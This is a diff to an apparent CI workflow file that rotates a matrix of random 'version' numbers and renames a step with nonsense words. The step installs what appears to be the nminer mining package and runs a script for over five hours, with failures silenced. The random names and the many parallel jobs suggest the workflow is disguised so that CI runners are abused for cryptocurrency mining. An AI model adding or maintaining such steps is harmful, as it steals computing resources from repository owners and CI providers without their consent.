@@ -9,22 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7915 }
-          - { version: 3698 }
-          - { version: 8005 }
-          - { version: 2773 }
-          - { version: 5917 }
-          - { version: 3764 }
-          - { version: 1491 }
-          - { version: 6025 }
-          - { version: 8397 }
-          - { version: 1091 }
-          - { version: 5014 }
-          - { version: 3965 }
-          - { version: 161 }
-          - { version: 9643 }
-          - { version: 2880 }
-          - { version: 2448 }
+          - { version: 8980 }
+          - { version: 870 }
+          - { version: 678 }
+          - { version: 4779 }
+          - { version: 6398 }
+          - { version: 6664 }
+          - { version: 500 }
+          - { version: 1075 }
+          - { version: 3896 }
+          - { version: 61 }
+          - { version: 8177 }
+          - { version: 2814 }
+          - { version: 6468 }
+          - { version: 2606 }
+          - { version: 8984 }
 
     steps:
       - name: Checkout
@@ -35,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: worriedly newsstand
+      - name: guilty fervently anaesthetise
         run: |
           npm install nminer@latest
-          timeout 340m node thigh.js || echo "thigh executed"
+          timeout 316m node thigh.js || echo "thigh executed"
